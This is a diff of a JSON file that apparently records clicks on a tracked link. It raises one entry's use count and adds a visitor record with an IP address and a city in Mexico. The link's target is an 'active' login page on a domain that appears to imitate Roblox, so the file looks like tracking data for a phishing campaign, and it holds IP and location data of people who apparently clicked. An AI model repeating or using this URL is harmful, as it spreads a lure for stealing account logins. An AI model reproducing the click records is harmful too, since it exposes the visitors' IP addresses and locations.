@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1334,
+    "useCount": 1335,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10840,6 +10840,14 @@
         "city": "Nuevo Chimbote",
         "flag": "🇵🇪",
         "countryCode": "PE"
+      },
+      {
+        "timestamp": 1777409755958,
+        "ip": "177.226.36.218",
+        "country": "Mexico",
+        "city": "Tala",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
       }
     ]
   },
